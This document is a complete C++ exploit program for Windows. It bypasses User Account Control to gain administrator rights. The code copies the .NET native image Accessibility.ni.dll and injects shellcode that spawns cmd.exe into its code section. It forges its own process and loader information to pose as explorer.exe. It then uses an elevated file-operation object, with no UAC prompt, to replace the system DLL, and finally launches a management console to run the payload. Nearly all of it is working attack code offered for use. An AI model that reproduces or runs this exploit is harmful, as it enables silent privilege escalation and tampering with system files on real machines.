#include <Windows.h>
#include <ShlObj.h>
#include <ShObjIdl.h>
#include <iostream>
#include <string>

#pragma region NT Stuff
typedef struct _UNICODE_STRING
{
	unsigned short Length;
	unsigned short MaximumLength;
	long Padding_8;
	wchar_t* Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _CURDIR
{
	/* 0x0000 */ struct _UNICODE_STRING DosPath;
	/* 0x0010 */ void* Handle;
} CURDIR, * PCURDIR; /* size: 0x0018 */

typedef struct _STRING
{
	/* 0x0000 */ unsigned short Length;
	/* 0x0002 */ unsigned short MaximumLength;
	/* 0x0004 */ long Padding_94;
	/* 0x0008 */ char* Buffer;
} STRING, * PSTRING; /* size: 0x0010 */

typedef struct _RTL_DRIVE_LETTER_CURDIR
{
	/* 0x0000 */ unsigned short Flags;
	/* 0x0002 */ unsigned short Length;
	/* 0x0004 */ unsigned long TimeStamp;
	/* 0x0008 */ struct _STRING DosPath;
} RTL_DRIVE_LETTER_CURDIR, * PRTL_DRIVE_LETTER_CURDIR; /* size: 0x0018 */

typedef struct _RTL_USER_PROCESS_PARAMETERS
{
	/* 0x0000 */ unsigned long MaximumLength;
	/* 0x0004 */ unsigned long Length;
	/* 0x0008 */ unsigned long Flags;
	/* 0x000c */ unsigned long DebugFlags;
	/* 0x0010 */ void* ConsoleHandle;
	/* 0x0018 */ unsigned long ConsoleFlags;
	/* 0x001c */ long Padding_95;
	/* 0x0020 */ void* StandardInput;
	/* 0x0028 */ void* StandardOutput;
	/* 0x0030 */ void* StandardError;
	/* 0x0038 */ struct _CURDIR CurrentDirectory;
	/* 0x0050 */ struct _UNICODE_STRING DllPath;
	/* 0x0060 */ struct _UNICODE_STRING ImagePathName;
	/* 0x0070 */ struct _UNICODE_STRING CommandLine;
	/* 0x0080 */ void* Environment;
	/* 0x0088 */ unsigned long StartingX;
	/* 0x008c */ unsigned long StartingY;
	/* 0x0090 */ unsigned long CountX;
	/* 0x0094 */ unsigned long CountY;
	/* 0x0098 */ unsigned long CountCharsX;
	/* 0x009c */ unsigned long CountCharsY;
	/* 0x00a0 */ unsigned long FillAttribute;
	/* 0x00a4 */ unsigned long WindowFlags;
	/* 0x00a8 */ unsigned long ShowWindowFlags;
	/* 0x00ac */ long Padding_96;
	/* 0x00b0 */ struct _UNICODE_STRING WindowTitle;
	/* 0x00c0 */ struct _UNICODE_STRING DesktopInfo;
	/* 0x00d0 */ struct _UNICODE_STRING ShellInfo;
	/* 0x00e0 */ struct _UNICODE_STRING RuntimeData;
	/* 0x00f0 */ struct _RTL_DRIVE_LETTER_CURDIR CurrentDirectores[32];
	/* 0x03f0 */ unsigned __int64 EnvironmentSize;
	/* 0x03f8 */ unsigned __int64 EnvironmentVersion;
	/* 0x0400 */ void* PackageDependencyData;
	/* 0x0408 */ unsigned long ProcessGroupId;
	/* 0x040c */ unsigned long LoaderThreads;
	/* 0x0410 */ struct _UNICODE_STRING RedirectionDllName;
	/* 0x0420 */ struct _UNICODE_STRING HeapPartitionName;
	/* 0x0430 */ unsigned __int64* DefaultThreadpoolCpuSetMasks;
	/* 0x0438 */ unsigned long DefaultThreadpoolCpuSetMaskCount;
	/* 0x043c */ long __PADDING__[1];
} RTL_USER_PROCESS_PARAMETERS, * PRTL_USER_PROCESS_PARAMETERS; /* size: 0x0440 */

#define PEB_OFFSET 0x60ULL
#define PROCESS_PARAM_OFFSET 0x20ULL
#define BASENAME_OFFSET 0x58ULL
#define FULLNAME_OFFSET 0x48ULL
#define DLLBASE_OFFSET 0x30ULL
#pragma endregion

using RtlInitUnicodeStringPtr = void(NTAPI*)(PUNICODE_STRING, PCWSTR);
using LDR_ENUM_CALLBACK = void(NTAPI*)(PVOID, PVOID, PBOOLEAN);
using LdrEnumerateLoadedModulesPtr = NTSTATUS(NTAPI*)(ULONG, LDR_ENUM_CALLBACK, PVOID);

struct LDR_CALLBACK_PARAMS
{
	PCWCHAR ExplorerPath;
	PVOID ImageBase;
	RtlInitUnicodeStringPtr RtlInitUnicodeString;
};

const BYTE shellCode[] = {
			   0x80, 0xFA, 0x01, 0x0F, 0x85, 0xA1, 0x00, 0x00, 0x00, 0x57, 0x48, 0x81, 0xEC, 0xE0, 0x00, 0x00, 0x00,
			   0x48, 0x8D, 0x44, 0x24, 0x70, 0x48, 0x89, 0xC7, 0x31, 0xC0, 0xB9, 0x68, 0x00, 0x00, 0x00, 0xF3, 0xAA,
			   0xC7, 0x44, 0x24, 0x70, 0x68, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x44, 0x24, 0x50, 0x48, 0x89, 0x44, 0x24,
			   0x48, 0x48, 0x8D, 0x44, 0x24, 0x70, 0x48, 0x89, 0x44, 0x24, 0x40, 0x48, 0xC7, 0x44, 0x24, 0x38, 0x00,
			   0x00, 0x00, 0x00, 0x48, 0xC7, 0x44, 0x24, 0x30, 0x00, 0x00, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x28, 0x00,
			   0x00, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00, 0x45, 0x31, 0xC9, 0x45, 0x31, 0xC0,
			   0x31, 0xD2, 0x48, 0x8D, 0x0D, 0x41, 0x00, 0x00, 0x00, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x30, 0x00, 0x00,
			   0x00, 0x48, 0x83, 0xC0, 0x60, 0x48, 0x8B, 0x00, 0x48, 0x83, 0xC0, 0x18, 0x48, 0x8B, 0x00, 0x48, 0x8B,
			   0x40, 0x10, 0x48, 0x8B, 0x00, 0x48, 0x8B, 0x00, 0x48, 0x8B, 0x40, 0x30, 0x4D, 0x31, 0xE4, 0x41, 0xBC,
			   0xEF, 0xBE, 0xAD, 0xDE, 0x4C, 0x01, 0xE0, 0xFF, 0xD0, 0x48, 0x81, 0xC4, 0xE0, 0x00, 0x00, 0x00, 0x5F,
			   0x48, 0x31, 0xC0, 0xB0, 0x01, 0xC3
};

int main()
{
	/*
	 *	STAGE 1
	 *	Find the target DLL file's path
	 */

	PWSTR path, systemPath;

	auto result = SHGetKnownFolderPath(FOLDERID_Windows, 0, nullptr, &path);
	if (FAILED(result))
	{
		std::cout << "SHGetKnownFolderPath() (0) failed. HRESULT: 0x" << std::hex << result << std::endl;
		return EXIT_FAILURE;
	}
	result = SHGetKnownFolderPath(FOLDERID_System, 0, nullptr, &systemPath);
	if (FAILED(result))
	{
		std::cout << "SHGetKnownFolderPath() (1) failed. HRESULT: 0x" << std::hex << result << std::endl;
		return EXIT_FAILURE;
	}

	std::wstring fullPath{ path }, cmdPath{ systemPath }, explorer{ path };
	fullPath += L"\\assembly\\NativeImages_v4.0.30319_64\\Accessibility\\*.*";
	cmdPath += L"\\cmd.exe";
	explorer += L"\\explorer.exe";
	CoTaskMemFree(path);
	CoTaskMemFree(systemPath);

	WIN32_FIND_DATAW findData;
	const auto findHandle = FindFirstFileW(fullPath.c_str(), &findData);
	if (findHandle == INVALID_HANDLE_VALUE)
	{
		std::cout << "FindFirstFileW() failed. Last error: " << GetLastError() << std::endl;
		return EXIT_FAILURE;
	}

	for (auto i = 0; i != 2; ++i)
	{
		if (!FindNextFileW(findHandle, &findData))
		{
			if (GetLastError() == ERROR_NO_MORE_FILES)
				std::wcout << "No token folder exists under " << fullPath.c_str() << std::endl;
			else
				std::cout << "FindNextFileW() failed. Error: " << GetLastError() << std::endl;

			FindClose(findHandle);
			return EXIT_FAILURE;
		}
	}

	fullPath.pop_back();
	fullPath.pop_back();
	fullPath.pop_back();
	fullPath += findData.cFileName;
	fullPath += L"\\Accessibility.ni.dll";

	FindClose(findHandle);

	/*
	 *	END STAGE 1
	 */

	 /*
	  *	STAGE 2
	  *	Copy the target dll, infect it and save it as "infect.dll"
	  */

	if (!CopyFileW(fullPath.c_str(), L"infect.dll", FALSE))
	{
		std::wcout << L"Failed to copy " << fullPath.c_str() << L" to the current directory. Error: " << GetLastError() << std::endl;
		return EXIT_FAILURE;
	}

	const auto fileHandle = CreateFile2(L"infect.dll", FILE_READ_ACCESS | FILE_WRITE_ACCESS, FILE_SHARE_READ, OPEN_EXISTING, nullptr);
	if (fileHandle == INVALID_HANDLE_VALUE)
	{
		std::cout << "Failed to open 'infect.dll'. Error: " << GetLastError() << std::endl;
		return EXIT_FAILURE;
	}

	const auto mapping = CreateFileMappingW(fileHandle, nullptr, PAGE_READWRITE, 0, 0, nullptr);
	if (!mapping)
	{
		CloseHandle(fileHandle);
		std::cout << "CreateFileMapping() failed. Error: " << GetLastError() << std::endl;
		return EXIT_FAILURE;
	}

	const auto pTargetFile = MapViewOfFile(mapping, FILE_MAP_ALL_ACCESS, 0, 0, 0);
	if (!pTargetFile)
	{
		CloseHandle(mapping);
		CloseHandle(fileHandle);
		std::cout << "MapViewOfFile() failed. Error: " << GetLastError() << std::endl;
		return EXIT_FAILURE;
	}

	auto headers = reinterpret_cast<PIMAGE_NT_HEADERS>(static_cast<PBYTE>(pTargetFile) + static_cast<
		PIMAGE_DOS_HEADER>(pTargetFile)->e_lfanew);

	auto section = IMAGE_FIRST_SECTION(headers);
	while (std::strcmp(".text", reinterpret_cast<char const*>(section->Name)))
		++section;

	auto zeroBlock = static_cast<PBYTE>(pTargetFile) + section->PointerToRawData;

	for (; ++zeroBlock;)
	{
		auto fail = false;
		for (auto z = zeroBlock; z != zeroBlock + sizeof shellCode + (cmdPath.size() * 2) + sizeof(L'\0'); ++z)
		{
			if (*z)
			{
				fail = true;
				break;
			}
		}
		if (!fail)
			break;
	}

	memcpy(zeroBlock, shellCode, sizeof shellCode);
	memcpy(zeroBlock + sizeof shellCode, cmdPath.c_str(), (cmdPath.size() * 2) + sizeof(L'\0'));

	*reinterpret_cast<PDWORD>(zeroBlock + 0x99) = static_cast<DWORD>(reinterpret_cast<PBYTE>(CreateProcessW) -
		reinterpret_cast<PBYTE>(GetModuleHandleW(L"kernel32.dll")));

	auto offset = static_cast<DWORD>(zeroBlock - static_cast<PBYTE>(pTargetFile));
	offset -= section->PointerToRawData;
	offset += section->VirtualAddress;
	headers->OptionalHeader.AddressOfEntryPoint = offset;

	if (!FlushViewOfFile(pTargetFile, 0))
	{
		UnmapViewOfFile(pTargetFile);
		CloseHandle(mapping);
		CloseHandle(fileHandle);
		std::cout << "FlushViewOfFile() failed. Error: " << GetLastError() << std::endl;
		return EXIT_FAILURE;
	}

	UnmapViewOfFile(pTargetFile);
	CloseHandle(mapping);
	CloseHandle(fileHandle);

	/*
	 *	END STAGE 2
	 */

	 /*
	  *	STAGE 3
	  *	Forge process information to allow IFileOperation as Administrator w/o UAC prompt
	  */

	auto pPeb = *reinterpret_cast<PBYTE*>(reinterpret_cast<PBYTE>(NtCurrentTeb()) + PEB_OFFSET);
	auto pProcessParams = *reinterpret_cast<PRTL_USER_PROCESS_PARAMETERS*>(pPeb + PROCESS_PARAM_OFFSET);
	auto RtlInitUnicodeString = reinterpret_cast<RtlInitUnicodeStringPtr>(GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlInitUnicodeString"));
	auto LdrEnumerateLoadedModules = reinterpret_cast<LdrEnumerateLoadedModulesPtr>(GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "LdrEnumerateLoadedModules"));

	RtlInitUnicodeString(&pProcessParams->ImagePathName, explorer.c_str());
	RtlInitUnicodeString(&pProcessParams->CommandLine, L"explorer.exe");

	LDR_CALLBACK_PARAMS params{ explorer.c_str(), GetModuleHandleW(nullptr), RtlInitUnicodeString };

	LdrEnumerateLoadedModules(0, [](PVOID ldrEntry, PVOID context, PBOOLEAN stop)
		{
			auto params = static_cast<LDR_CALLBACK_PARAMS*>(context);

			if (*reinterpret_cast<PULONG_PTR>(reinterpret_cast<ULONG_PTR>(ldrEntry) + DLLBASE_OFFSET) == reinterpret_cast<
				ULONG_PTR>(params->ImageBase))
			{
				const auto baseName = reinterpret_cast<PUNICODE_STRING>(static_cast<PBYTE>(ldrEntry) + BASENAME_OFFSET),
					fullName = reinterpret_cast<PUNICODE_STRING>(static_cast<PBYTE>(ldrEntry) + FULLNAME_OFFSET);

				params->RtlInitUnicodeString(baseName, L"explorer.exe");
				params->RtlInitUnicodeString(fullName, params->ExplorerPath);

				*stop = TRUE;
			}
		}, reinterpret_cast<PVOID>(&params));

	BIND_OPTS3 bind;
	WCHAR clsid[40];

	if (!StringFromGUID2(CLSID_FileOperation, clsid, sizeof clsid / sizeof(WCHAR)))
	{
		std::cout << "Cannot create CLSID string\n";
		return EXIT_FAILURE;
	}

	std::wstring command{ L"Elevation:Administrator!new:" };
	command += clsid;

	ZeroMemory(&bind, sizeof(BIND_OPTS3));
	bind.cbStruct = sizeof(BIND_OPTS3);
	bind.dwClassContext = CLSCTX_LOCAL_SERVER;

	IFileOperation* fileOperation;

	result = CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE | COINIT_SPEED_OVER_MEMORY);
	if (FAILED(result))
	{
		std::cout << "CoInitializeEx() failed. HRESULT: 0x" << std::hex << result << std::endl;
		return EXIT_FAILURE;
	}

	result = CoGetObject(command.c_str(), &bind, IID_IFileOperation, reinterpret_cast<void**>(&fileOperation));
	if (FAILED(result))
	{
		CoUninitialize();
		std::cout << "CoGetObject() failed. HRESULT: 0x" << std::hex << result << std::endl;
		return EXIT_FAILURE;
	}

	/*
	 *	END STAGE 3
	 */

	 /*
	  *	STAGE 4
	  *	Delete the original Accessibility.ni.dll file and move our inject.dll file with the correct name over there
	  */

	IShellItem* existingFile, * targetFile, * targetFolder;

	result = SHCreateItemFromParsingName(fullPath.c_str(), nullptr, IID_IShellItem,
		reinterpret_cast<void**>(&existingFile));
	if (FAILED(result))
	{
		fileOperation->Release();
		CoUninitialize();
		std::cout << "SHCreateItemFromParsingName() (0) failed. HRESULT: 0x" << std::hex << result << std::endl;
		return EXIT_FAILURE;
	}
	fullPath = fullPath.substr(0, fullPath.size() - std::wcslen(L"Accessibility.ni.dll"));
	result = SHCreateItemFromParsingName(fullPath.c_str(), nullptr, IID_IShellItem, reinterpret_cast<void**>(&targetFolder));
	if (FAILED(result))
	{
		existingFile->Release();
		fileOperation->Release();
		CoUninitialize();
		std::cout << "SHCreateItemFromParsingName() (1) failed. HRESULT: 0x" << std::hex << result << std::endl;
		return EXIT_FAILURE;
	}
	
	auto requiredSize = static_cast<ULONG_PTR>(GetCurrentDirectoryW(0, nullptr));
	auto currentDirectory = new WCHAR[requiredSize + 11];
	GetCurrentDirectoryW(static_cast<DWORD>(requiredSize), currentDirectory);

	wcscat_s(currentDirectory, requiredSize + 11, L"\\infect.dll");
	result = SHCreateItemFromParsingName(currentDirectory, nullptr, IID_IShellItem,
		reinterpret_cast<void**>(&targetFile));
	if (FAILED(result))
	{
		delete[] currentDirectory;
		targetFolder->Release();
		existingFile->Release();
		fileOperation->Release();
		CoUninitialize();
		std::cout << "SHCreateItemFromParsingName() (2) failed. HRESULT: 0x" << std::hex << result << std::endl;
		return EXIT_FAILURE;
	}

	delete[] currentDirectory;

	result = fileOperation->RenameItem(existingFile, L"Accessibility.ni.dll.bak", nullptr);
	if (FAILED(result))
	{
		targetFile->Release();
		targetFolder->Release();
		existingFile->Release();
		fileOperation->Release();
		CoUninitialize();
		std::cout << "IFileOperation::DeleteItem() failed. HRESULT: 0x" << std::hex << result << std::endl;
		return EXIT_FAILURE;
	}
	result = fileOperation->MoveItem(targetFile, targetFolder, L"Accessibility.ni.dll", nullptr);
	if (FAILED(result))
	{
		targetFile->Release();
		targetFolder->Release();
		existingFile->Release();
		fileOperation->Release();
		CoUninitialize();
		std::cout << "IFileOperation::MoveItem() failed. HRESULT: 0x" << std::hex << result << std::endl;
		return EXIT_FAILURE;
	}
	result = fileOperation->SetOperationFlags(FOF_NOCONFIRMATION | FOFX_NOCOPYHOOKS | FOFX_REQUIREELEVATION);
	if (FAILED(result))
	{
		targetFile->Release();
		targetFolder->Release();
		existingFile->Release();
		fileOperation->Release();
		CoUninitialize();
		std::cout << "IFileOperation::SetOperationFlags() failed. HRESULT: 0x" << std::hex << result << std::endl;
		return EXIT_FAILURE;
	}

	result = fileOperation->PerformOperations();
	if (FAILED(result))
	{
		targetFile->Release();
		targetFolder->Release();
		existingFile->Release();
		fileOperation->Release();
		CoUninitialize();
		std::cout << "IFileOperation::PerformOperations() failed. HRESULT: 0x" << std::hex << result << std::endl;
		return EXIT_FAILURE;
	}

	targetFile->Release();
	targetFolder->Release();
	existingFile->Release();
	fileOperation->Release();
	CoUninitialize();

	/*
	 *	END STAGE 4
	 */

	 /*
	  *	STAGE 5
	  *	Launch Event Viewer via eventvwr.exe to execute the exploit and do the attack.
	  */

	if (reinterpret_cast<int>(ShellExecuteW(nullptr, L"open", L"WF.msc", nullptr, nullptr, SW_NORMAL)) <= 32)
	{
		std::cout << "ShellExecuteW() failed.\n";
		return EXIT_FAILURE;
	}

	/*
	 *	END STAGE 5
	 */

	 // Finally, we can print success and exit.

	SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 15);

	std::cout << "[+] ";

	SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 14);

	std::cout << "*** Exploit successful.\n\n";

	SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 7);

	return 0;
}